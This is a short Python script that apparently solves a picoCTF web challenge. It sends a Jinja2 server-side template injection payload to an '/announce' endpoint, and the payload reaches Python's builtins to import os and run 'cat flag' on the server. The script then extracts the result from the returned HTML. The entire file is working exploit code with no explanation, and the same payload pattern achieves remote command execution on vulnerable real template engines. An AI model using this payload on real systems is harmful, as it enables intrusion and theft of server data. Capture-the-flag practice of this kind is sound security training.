import requests
import sys
from bs4 import BeautifulSoup

def main(p):
    url = f"http://rescued-float.picoctf.net:{p}/announce"
    payload = {"content":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}"}
    
    r = requests.post(url,data=payload)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text,"html.parser")
        flag = soup.h1.text
        print(flag)

    else:
       print(r.raise_for_status())

if __name__ == "__main__":
    try:
        port = sys.argv[1]
        if len(sys.argv) == 2:
            main(port)
            
    except (ValueError,IndexError):
        print("Usage: script.py <port>")
